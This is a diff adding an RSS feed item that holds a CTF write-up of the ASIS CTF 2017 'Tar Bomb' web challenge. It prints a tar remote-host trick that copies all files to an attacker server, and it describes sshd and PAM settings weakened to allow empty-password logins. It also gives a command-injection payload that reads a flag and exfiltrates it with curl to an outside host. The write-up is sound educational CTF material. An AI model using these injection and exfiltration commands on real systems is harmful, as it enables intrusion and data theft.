@@ -10,6 +10,85 @@
     <atom:link href="http://robinverton.de/ctf/index.xml" rel="self" type="application/rss+xml" />
     
     <item>
+      <title>ASIS CTF 2017, Tar Bomb, Web129</title>
+      <link>http://robinverton.de/ctf/asisctf-2017-tar-bomb-web129/</link>
+      <pubDate>Sun, 26 Mar 2017 13:15:12 +0200</pubDate>
+      
+      <guid>http://robinverton.de/ctf/asisctf-2017-tar-bomb-web129/</guid>
+      <description>
+
+&lt;p&gt;This was not a typical web challenge, apart from beeing accessible over the web. The aim was to successfully execute a tar command (and do something usefull with it). The returned code of executed tar command was then returned to the user. I always got a &amp;ldquo;tar returned 2&amp;rdquo;, meaning that the file I was trying to (un)tar was not found. Chars to travers or inject were all filtered.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://robinverton.de/static/ctf/asis2017-web129-1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I tried different techniques of command injection, but had not success with this. So I dug into the man pages of tar and found this nice little thing:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;     --force-local
+           archive file is local even if it has a colon
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This brought me onto the track that there may be a way to define a remote (tape) device to (un)tar from and to. And yeah, I was &lt;a href=&#34;ftp://ftp.gnu.org/old-gnu/Manuals/tar/html_node/tar_127.html&#34;&gt;right&lt;/a&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-plain&#34;&gt;If the file name contains a `:&#39;, it is interpreted as `hostname:file name&#39;. If the hostname contains an at sign (@), it is treated as `user@hostname:file name&#39;. In either case, tar will invoke the command rsh (or remsh) to start up an `/etc/rmt&#39; on the remote machine.
+
+If you give an alternate login name, it will be given to the rsh. Naturally, the remote machine must have an executable `/etc/rmt&#39;. This program is free software from the University of California, and a copy of the source code
+can be found with the sources for tar; it&#39;s compiled and installed by default.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Great, so let&amp;rsquo;s try it. To verify this, I passed &lt;code&gt;tar tvf foo@unlink.io:foobar.tar&lt;/code&gt; and watched the auth.log on my server. And yeah, there was a failed connection attempt.&lt;/p&gt;
+
+&lt;h3 id=&#34;allowing-remote-access&#34;&gt;Allowing remote access&lt;/h3&gt;
+
+&lt;p&gt;The next step was allowing the remote server to log in. This took me longer than I thought, because setting up an insecure sshd is hard. I created a user with no password (&lt;code&gt;passwd -d username&lt;/code&gt;) and allowed login with an (empty) password in my sshd_config:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-plain&#34;&gt;PermitEmptyPasswords no
+PasswordAuthentication yes
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;But I was still not able to login via an empty password over ssh. Why? After searching for a long time I came around this &lt;a href=&#34;https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=93200&amp;amp;repeatmerged=yes&#34;&gt;debian bug report&lt;/a&gt;. The TLDR of it: &lt;code&gt;ssh&lt;/code&gt; is not a secure tty, so you have to tell &lt;code&gt;pam.d&lt;/code&gt; that it is okay to pass an empty password (replace &lt;em&gt;nullok_securer&lt;/em&gt; with &lt;em&gt;nullok&lt;/em&gt; in &lt;em&gt;/etc/pam.d/common-auth&lt;/em&gt;).&lt;/p&gt;
+
+&lt;h3 id=&#34;getting-all-files&#34;&gt;Getting all files&lt;/h3&gt;
+
+&lt;p&gt;So I felt I was near the finish. I prepared the sshd and build a command to tar me every file from the remote server and place the .tar on my server:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;tar cf pwn@myserver:foo.tar *
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://robinverton.de/static/ctf/asis2017-web129-2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Got it! But where is the flag? .. So as you can see, this was still not the end.&lt;/p&gt;
+
+&lt;h3 id=&#34;the-real-web-challenge&#34;&gt;The real web challenge&lt;/h3&gt;
+
+&lt;p&gt;After inspecting the PHP files, this was the basic functionality of them:&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;admin_console.php&lt;/strong&gt;
+After checking existence of a cookie and a proof of work (MD5 brute), send a URL to a phantomjs script.
+&lt;script src=&#34;//gist.github.com/rverton/248a03afb0f7f5451fa253feb8a3b440.js&#34;&gt;&lt;/script&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;readflag.php&lt;/strong&gt;: If REMOTE_ADDR is localhost, open /flag and print it.
+&lt;script src=&#34;//gist.github.com/rverton/7f94b907a39ec2e063f843bdd80dc754.js&#34;&gt;&lt;/script&gt;&lt;/p&gt;
+
+&lt;p&gt;Note: I will not go into the detail of the substr(md5(str), 0, 6) proof of work here.&lt;/p&gt;
+
+&lt;p&gt;So the plan was to use the worker.js script to extract the flag. But it was not printed out, so what can we do here? If we look closely at the regex for the URL, we see that there is no end specified, thus allowing us to inject commands after a valid url.&lt;/p&gt;
+
+&lt;p&gt;Lets try to pass the output of the worker.js script to us via curl (nc was not available):&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://robinverton.de/static/ctf/asis2017-web129-3.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://robinverton.de/static/ctf/asis2017-web129-4.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;All right, still no flag. So screw this worker.js, let&amp;rsquo;s do it all by ourself instead:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;https://127.0.0.1&#39; | curl http://127.0.0.1/readflag.php &amp;gt; /tmp/foo &amp;amp;&amp;amp; curl -F &amp;quot;foo=@/tmp/foo&amp;quot; http://unlink.io:31337/ #
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://robinverton.de/static/ctf/asis2017-web129-6.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
       <title>VolgaCTF, web200 (Share Point)</title>
       <link>http://robinverton.de/ctf/volgactf-web200-sharepoint/</link>
       <pubDate>Sun, 26 Mar 2017 13:15:12 +0200</pubDate>
